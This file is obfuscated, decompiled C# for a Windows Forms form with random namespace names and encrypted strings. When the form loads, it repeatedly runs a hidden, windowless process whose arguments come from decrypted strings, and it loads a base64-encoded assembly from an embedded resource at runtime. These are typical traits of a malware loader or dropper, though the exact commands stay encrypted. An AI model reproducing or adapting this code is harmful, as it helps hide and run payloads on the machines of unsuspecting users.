using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Uibljkvlvrvecwgkr;

namespace Dlsbdzokygwszrbyphdiuxiy;

public sealed class h : Form
{
	private IContainer m_a;

	public h()
	{
		if (4u != 0)
		{
			c();
		}
	}

	private void a(object a, EventArgs b)
	{
		List<string> obj = new List<string>
		{
			k.a(491275869),
			k.a(491275848),
			k.a(491275845)
		};
		List<string> list;
		if (6u != 0)
		{
			list = obj;
		}
		int n;
		if (2u != 0)
		{
			n = 0;
		}
		for (; n < 20; n++)
		{
			string text = k.a(491275891) + list[new Random().Next(list.Count - 1)] + k.a(491275800);
			if (7u != 0)
			{
				this.a(text);
			}
		}
		this.a();
		this.b();
	}

	private void a()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		_ = 0;
		if (1 == 0)
		{
		}
		currentDomain.AssemblyResolve += a;
	}

	private void b()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		_ = 3;
		if (2 == 0)
		{
		}
		_ = -1;
		if (1 == 0)
		{
		}
		((Control)this).set_Text(((Control)this).get_Text() + new ClassLibrary().Data());
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		string text = k.a(491275797);
		string name;
		if (5u != 0)
		{
			name = text;
		}
		Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		Stream stream;
		if (uint.MaxValue != 0)
		{
			stream = manifestResourceStream;
		}
		try
		{
			byte[] array = new byte[stream.Length];
			byte[] array2;
			if (3u != 0)
			{
				array2 = array;
			}
			stream.Read(array2, 0, array2.Length);
			byte[] rawAssembly = Convert.FromBase64String(Encoding.UTF8.GetString(array2).Replace(k.a(491275992), string.Empty));
			return AppDomain.CurrentDomain.Load(rawAssembly);
		}
		finally
		{
			((IDisposable)stream)?.Dispose();
		}
	}

	private void a(string a)
	{
		string text = k.a(491275977).Replace(k.a(491276026), string.Empty);
		string fileName;
		if (2u != 0)
		{
			fileName = text;
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName,
			Arguments = a,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit();
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		if (7u != 0)
		{
			((Form)this).Dispose(a);
		}
	}

	private void c()
	{
		if (6u != 0)
		{
			((Control)this).SuspendLayout();
		}
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		if (6u != 0)
		{
			((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		}
		if (uint.MaxValue != 0)
		{
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		}
		((Form)this).set_ClientSize(new Size(379, 197));
		((Control)this).set_Name(k.a(491276018));
		((Control)this).set_Text(k.a(491276018));
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
